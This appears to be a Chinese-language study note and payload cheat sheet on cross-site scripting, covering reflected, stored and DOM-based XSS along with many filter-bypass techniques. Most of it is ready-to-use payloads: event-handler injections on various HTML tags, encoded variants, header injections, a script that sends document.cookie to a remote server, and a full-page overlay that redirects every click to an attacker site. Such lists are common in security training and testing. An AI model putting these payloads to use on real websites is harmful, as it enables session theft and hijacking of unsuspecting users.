# XSS

Cross Site Scripting

==跨站脚本攻击==

基本原理就是将恶意的script插入js中



```javascript
<script>
    alert(document.cookie);
</script>
```



## Reflected

表单提交

```
?payload=<script>alert(‘1’)</script>
```



访问不到资源就弹窗

```
?payload=<img+src=http://192.168.1.1/a.jpg+onerror=alert('xss')>#
```



返回当前cookie信息到远程服务器上

```
?payload=<script>new Image().src="http://192.168.1.102/c.php?output="+document.cookie;</script>
```



## Stored

评论之类的，







## DOM

属性方法

document.write

标志#



DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如`img`，`input`等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。









### 总结：

- 标签语法替换 
- 特殊符号干扰 
- 提交方式更改 
- 垃圾数据溢出 
- 加密解密算法 
- 结合其他漏洞绕过

标签闭合，双写绕过，大小写绕过，==alert，confirm，prompt==，构造a，img标签，转为Unicode编码，autofocus 属性，http报文中篡改等等

总的来说

```
"><script>alert(1)</script>
xx' onmouseover='alert(1)
xx" onmouseover="alert(1)
"> <a href="javascript:alert(1)">1</a>
"> <a Href="javascript:alert(1)">1</a>
"><sscriptcript>alert(1)</scscriptript>
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
?t_link=&t_history=&t_sort="%20onclick="alert(1)"%20type=""
Referer: "type="text" autofocus onfocus="alert(1)"
User-Agent: " type="text" autofocus onfocus="alert(1)"
Cookie: user=" type="button" onclick="alert(1)
'level1.php?name=test<img src=1 onerror=alert(1)>'
?keyword=<img%0Asrc=1%0Aonerror=alert(1)>
```





- audio

```
<audio src=x onerror=alert(47)>
<audio src=x onerror=prompt(1);>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
```



- video

```
<video src=x onerror=prompt(1);>
<video src=x onerror=alert(48)>
```



- div

```
<div style="width:expression(alert(/1/))">1</div>     ie浏览器执行
<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>   url编码绕过
```



- math

```
<math><a/xlink:href=javascript:prompt(1)>Xss

<math href="javascript:javascript:alert(1)">Xss</math>
```



- button

```
<button onfocus=alert(1) autofocus>
<button/onclick=alert(1) >xss</button>
```



- keygen

```
<keygen/onfocus=prompt(1);>
<keygen onfocus=javascript:alert(1) autofocus>
```



- object

```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

base64加密：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    
      解码：<script>alert(1)</script>
```





综合应用直接

效果就是点击页面任何一个空白的位置都会跳转到目标网址

```
<div style="opacity:0;filter:alpha(opacity=20);background-color:#000;width:100%;height:100%;z-index:10;top:0;left:0;position:fixed;" onclick="document.location='http://attacker.co.nf/'"></div><script>alert("click anywhere on page");</script>
```



自动化工具fuzz



